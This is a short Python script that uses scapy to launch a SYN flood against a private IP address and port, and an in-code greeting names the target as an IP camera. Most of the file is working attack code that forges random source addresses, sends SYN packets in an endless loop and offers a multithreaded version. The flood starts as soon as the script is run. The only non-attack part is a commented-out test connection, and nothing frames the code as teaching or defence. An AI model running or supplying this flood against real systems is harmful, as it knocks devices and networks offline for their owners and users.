from scapy.all import *
import socket
import threading
import random

# Target IP and port
target_ip = "192.168.67.13"
target_port = 8556

def normal_traffic():
    # Create a TCP socket
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    # Send some data
    client.send(b"Hello, IP Camera!\n")

    # Receive response (optional)
    response = client.recv(4096)
    print(response.decode())

    client.close()

# SYN Flood function
def syn_flood():
    while True:
        # Random source IP and port
        src_ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"  # Local subnet spoofing
        src_port = random.randint(1024, 65535)  # Random source port
        
        # Create SYN packet
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))
        
        # Combine layers into a packet
        packet = ip_layer / tcp_layer
        
        # Send the packet
        send(packet, verbose=False)

def serious_syn_flood():
    # Number of threads for the attack
    num_threads = 10

    # Launch multiple threads for SYN flood
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=syn_flood)
        t.start()
        threads.append(t)

    # Optional: Join threads to keep the script running
    for t in threads:
        t.join()


#Run normal Traffic
#normal_traffic()

# Run the flood
syn_flood()

#more serious syn flood
#serious_syn_flood()